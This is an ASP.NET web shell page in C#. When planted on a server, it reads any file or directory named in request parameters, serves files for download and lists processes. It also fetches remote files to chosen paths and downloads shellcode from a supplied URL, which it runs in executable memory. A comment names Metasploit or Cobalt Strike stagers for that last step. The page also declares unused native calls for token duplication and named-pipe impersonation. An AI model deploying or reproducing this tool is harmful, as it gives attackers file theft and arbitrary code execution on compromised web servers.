<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Security" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="Microsoft.Win32.SafeHandles" %>


<script runat="server">
    //usage aspx?dir=c:\users\mario&cat=c:\users\mario\secret.txt
    protected void Page_Load(object sender, EventArgs e)
    {     
        Snip();
    }
delegate int MsfpayloadProc();
public const UInt32 Infinite = 0xffffffff;
public const Int32 Startf_UseStdHandles = 0x00000100;
public const Int32 StdOutputHandle = -11;
public const Int32 StdErrorHandle = -12;

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
public struct StartupInfoFrFr
{
    public int cb;
    public String reserved;
    public String desktop;
    public String title;
    public int x;
    public int y;
    public int xSize;
    public int ySize;
    public int xCountChars;
    public int yCountChars;
    public int fillAttribute;
    public int flags;
    public UInt16 showWindow;
    public UInt16 reserved2;
    public byte reserved3;
    public IntPtr stdInput;
    public IntPtr stdOutput;
    public IntPtr stdError;
}

public struct ProcessInformation
{
    public IntPtr process;
    public IntPtr thread;
    public int processId;
    public int threadId;
}

[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool CreateProcessWithLogonW(
    String userName,
    String domain,
    String password,
    UInt32 logonFlags,
    String applicationName,
    String commandLine,
    UInt32 creationFlags,
    UInt32 environment,
    String currentDirectory,
    ref   STARTUPINFO lpStartupInfo,
    out  PROCESS_INFORMATION lpProcessInformation);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool GetExitCodeProcess(IntPtr process, ref UInt32 exitCode);

[DllImport("Kernel32.dll", SetLastError = true)]
public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

[DllImport("Kernel32.dll", SetLastError = true)]
public static extern IntPtr GetStdHandle(IntPtr handle);



    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }
    
    
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName,
       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    public static uint INFINITE = 0xFFFFFFFF;
    
    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    internal struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    public const int STD_INPUT_HANDLE = -10;
    public const int STD_OUTPUT_HANDLE = -11;
    public const int STD_ERROR_HANDLE = -12;
    
    [DllImport("kernel32")]
    static extern bool AllocConsole();


    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo, 
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern int inet_addr([In] string cp);
    [DllImport("ws2_32.dll")]
    private static extern string inet_ntoa(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint htonl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern uint ntohl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort htons(ushort ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort ntohs(ushort ip);   

    
   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int send(
                                [In] IntPtr socketHandle,
                                [In] byte[] pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int recv(
                                [In] IntPtr socketHandle,
                                [In] IntPtr pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int closesocket(
                                       [In] IntPtr socketHandle
                                       );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern IntPtr accept(
                                  [In] IntPtr socketHandle,
                                  [In, Out] ref sockaddr_in socketAddress,
                                  [In, Out] ref int socketAddressSize
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int listen(
                                  [In] IntPtr socketHandle,
                                  [In] int backlog
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int bind(
                                [In] IntPtr socketHandle,
                                [In] ref sockaddr_in  socketAddress,
                                [In] int socketAddressSize
                                );


   public enum TOKEN_INFORMATION_CLASS
   {
       TokenUser = 1,
       TokenGroups,
       TokenPrivileges,
       TokenOwner,
       TokenPrimaryGroup,
       TokenDefaultDacl,
       TokenSource,
       TokenType,
       TokenImpersonationLevel,
       TokenStatistics,
       TokenRestrictedSids,
       TokenSessionId
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public static extern bool GetTokenInformation(
       IntPtr hToken,
       TOKEN_INFORMATION_CLASS tokenInfoClass,
       IntPtr TokenInformation,
       int tokeInfoLength,
       ref int reqLength);

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }


    [DllImport("Kernel32.dll", EntryPoint = "VirtualAlloc")]
    public static extern IntPtr VirtualAlloc(IntPtr address, int size, uint allocType, uint protect);
    [DllImport("Kernel32.dll", EntryPoint = "VirtualFree")]
    public static extern bool VirtualFree(IntPtr address, int size, uint freeType);


   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
       ref IntPtr DuplicateTokenHandle);


   

   const int ERROR_NO_MORE_ITEMS = 259;

   [StructLayout(LayoutKind.Sequential)]
   struct TOKEN_USER
   {
       public _SID_AND_ATTRIBUTES User;
   }

   [StructLayout(LayoutKind.Sequential)]
   public struct _SID_AND_ATTRIBUTES
   {
       public IntPtr Sid;
       public int Attributes;
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool LookupAccountSid
   (
       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
       IntPtr pSid,
       StringBuilder Account,
       ref int cbName,
       StringBuilder DomainName,
       ref int cbDomainName,
       ref int peUse 

   );

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool ConvertSidToStringSid(
       IntPtr pSID,
       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool CloseHandle(
       IntPtr hHandle);

   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
   [Flags]
   public enum ProcessAccessFlags : uint
   {
       All = 0x001F0FFF,
       Terminate = 0x00000001,
       CreateThread = 0x00000002,
       VMOperation = 0x00000008,
       VMRead = 0x00000010,
       VMWrite = 0x00000020,
       DupHandle = 0x00000040,
       SetInformation = 0x00000200,
       QueryInformation = 0x00000400,
       Synchronize = 0x00100000
   }

   [DllImport("kernel32.dll")]
   static extern IntPtr GetCurrentProcess();

   [DllImport("kernel32.dll")]
   extern static IntPtr GetCurrentThread();


   [DllImport("kernel32.dll", SetLastError = true)]
   [return: MarshalAs(UnmanagedType.Bool)]
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(IntPtr hProcess,
    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
    uint cb,
    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

    [DllImport("psapi.dll")]
    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);

    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_NOWAIT = 0x00000001;
    public const uint PIPE_READMODE_BYTE = 0x00000000;
    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
    public const uint PIPE_TYPE_BYTE = 0x00000000;
    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
    public const uint PIPE_CLIENT_END = 0x00000000;
    public const uint PIPE_SERVER_END = 0x00000001;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;

    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
    public const uint NMPWAIT_NOWAIT = 0x00000001;
    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

    public const uint GENERIC_READ = (0x80000000);
    public const uint GENERIC_WRITE = (0x40000000);
    public const uint GENERIC_EXECUTE = (0x20000000);
    public const uint GENERIC_ALL = (0x10000000);

    public const uint CREATE_NEW = 1;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;
    public const uint OPEN_ALWAYS = 4;
    public const uint TRUNCATE_EXISTING = 5;

    public const int INVALID_HANDLE_VALUE = -1;

    public const ulong ERROR_SUCCESS = 0;
    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
    public const ulong ERROR_PIPE_BUSY = 231;
    public const ulong ERROR_NO_DATA = 232;
    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
    public const ulong ERROR_MORE_DATA = 234;
    public const ulong ERROR_PIPE_CONNECTED = 535;
    public const ulong ERROR_PIPE_LISTENING = 536;
    
    public const int LOGON32_LOGON_INTERACTIVE = 2;
    public const int LOGON32_LOGON_NETWORK = 3;
    public const int LOGON32_LOGON_BATCH = 4;
    public const int LOGON32_LOGON_SERVICE = 5;
    public const int LOGON32_LOGON_UNLOCK = 7;
    public const int LOGON32_LOGON_NETWORK_CLEARTEXT = 8;
    public const int LOGON32_LOGON_NEW_CREDENTIALS = 9;

    public const int LOGON32_PROVIDER_DEFAULT = 0;
    public const int LOGON32_PROVIDER_WINNT35 = 1;
    public const int LOGON32_PROVIDER_WINNT40 = 2;
    public const int LOGON32_PROVIDER_WINNT50 = 3;

    //virtualMemoryflags
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_RELEASE = 0x8000;

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(String lpszUsername, String lpszDomain, String lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipe(
        String lpName,                                  
        uint dwOpenMode,                                
        uint dwPipeMode,                                
        uint nMaxInstances,                         
        uint nOutBufferSize,                        
        uint nInBufferSize,                         
        uint nDefaultTimeOut,                       
        IntPtr pipeSecurityDescriptor
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(
        IntPtr hHandle,
        uint lpOverlapped
        );

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(
        IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetNamedPipeHandleState(
        IntPtr hHandle,
        IntPtr lpState,
        IntPtr lpCurInstances,
        IntPtr lpMaxCollectionCount,
        IntPtr lpCollectDataTimeout,
        StringBuilder lpUserName,
        int nMaxUserNameSize
        );
   
        private static SecureString MakeSecureString(string text)
        {
            SecureString secure = new SecureString();
            foreach (char c in text)
            {
                secure.AppendChar(c);
            }

            return secure;
        }

    protected void Snip()
    {
    bool retValue;
                       // Check the identity.
                       Response.Write("Executing as ...  "
                            + WindowsIdentity.GetCurrent().Name + "</br>");
                            if(!(String.IsNullOrEmpty(Request.Params["UploadSource"]) && String.IsNullOrEmpty(Request.Params["UploadDestination"])) ){
                            WebClient webClient = new WebClient();
                            webClient.DownloadFile(Request.Params["UploadSource"], Request.Params["UploadDestination"]);
                            }
                        
                            if(String.IsNullOrEmpty(Request.Params["cat"])){

                            
                            }else{
                            string text = System.IO.File.ReadAllText(Request.Params["cat"]);
                            Response.Write("</br> <pre>" + text + "</pre></br>");
                            }
                            if(String.IsNullOrEmpty(Request.Params["dir"])){

                            }else{

                            string [] fileEntries = Directory.GetFiles(Request.Params["dir"]);
                            foreach(string fileName in fileEntries)
                            Response.Write("F - " + File.GetLastWriteTime(fileName) + " " + fileName + "</br>");

                            string [] subdirectoryEntries = Directory.GetDirectories(Request.Params["dir"]);
                            foreach(string subdirectory in subdirectoryEntries)
                            Response.Write("D - " + Directory.GetLastWriteTime(subdirectory) + " " + subdirectory + "</br>");
                            }
                            //download
                            if(!String.IsNullOrEmpty((Request.QueryString["FileDownload"]))){
                            string fName = Request.QueryString["FileDownload"];
                            FileInfo fi = new FileInfo(fName);
                            long sz = fi.Length;
                            Response.ClearContent();
                            Response.AppendHeader("Content-Disposition", string.Format("attachment; filename={0}", System.IO.Path.GetFileName(fName)));
                            Response.ContentType = "application/octet-stream";
                            Response.TransmitFile(fName);
                            Response.End();
                            }
                        //processes
                                if(!(String.IsNullOrEmpty((Request.QueryString["Process"])))){
                                Process[] processlist = Process.GetProcesses();
                                Response.Write("<pre>");
                                foreach (Process theprocess in processlist)
                                {
                                    Response.Write("Process:" + theprocess.ProcessName + " ID: " + theprocess.Id + "</br>");
                                }
                                Response.Write("</pre>");

                            }
                         //download&load
                         if(!(String.IsNullOrEmpty((Request.QueryString["shellcodeURL"])))){
                            //(new WebClient()).DownloadFile(Request.QueryString["memory"], "c:\\users\\public\\tmp.bin");
                            //need raw bin stager <= -f raw on metasploit, raw on cobalstrike
                            byte[] codeBytes = (new WebClient()).DownloadData(Request.QueryString["shellcodeURL"]);
                                IntPtr handle = IntPtr.Zero;
                                handle = VirtualAlloc(
                                    IntPtr.Zero,
                                    codeBytes.Length,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
                                try
                                {
                                    Marshal.Copy(codeBytes, 0, handle, codeBytes.Length);
                                    MsfpayloadProc msfpayload
                                    = Marshal.GetDelegateForFunctionPointer(handle, typeof(MsfpayloadProc)) as MsfpayloadProc;
                                    msfpayload();
                                }
                                finally
                                {
                                    VirtualFree(handle, 0, MEM_RELEASE);
                                }

                            }      

                    
                

    }



    </script>
